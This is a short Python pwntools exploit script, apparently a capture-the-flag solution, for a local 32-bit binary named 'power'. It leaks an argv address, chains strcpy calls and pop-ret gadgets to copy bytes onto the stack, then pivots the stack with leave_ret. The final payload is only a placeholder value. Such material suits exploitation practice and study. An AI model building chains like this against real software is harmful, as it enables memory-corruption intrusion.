from pwn import *

def search(byte):
	x = list(e.search(byte))
	for y in x:
		if 0x8048470 < y < 0x8048927:
			return y

	raise Exception("byte %02x not found!\n"%ord(byte))

if __name__ == "__main__":

	e = ELF("./power")
	libc = ELF("./libc_32.so")
	p = process("./power")
	#gdb.attach(p,gdbscript = "b *0x8048651")
	p.recvuntil("argv: ")
	argv = int(p.recvline(),16)

	INTMAX = 2**32-1
	readlen = 0x80485DE
	strcpy = 0x80485A3
	pr = 0x08048401
	ppr = 0x080486ba
	pppr = 0x080486b9
	pop_ebp = 0x080486bb
	leave_ret = 0x080484d8
	retstack = argv - 0x80 #avoid usage of null

	# idea: use strcpy to write custom data to stack
	loader = [INTMAX,INTMAX] # before return address
	ROP = p32(0xdeadbeef)

	for i in range(len(ROP)):
		loader += [strcpy,ppr,retstack+i,search(ROP[i])]
	loader += [pop_ebp, retstack-4, leave_ret]
	    
	pay = ""

	for x in loader:
		pay += p32(x)
	
	p.send(pay)

	p.interactive()
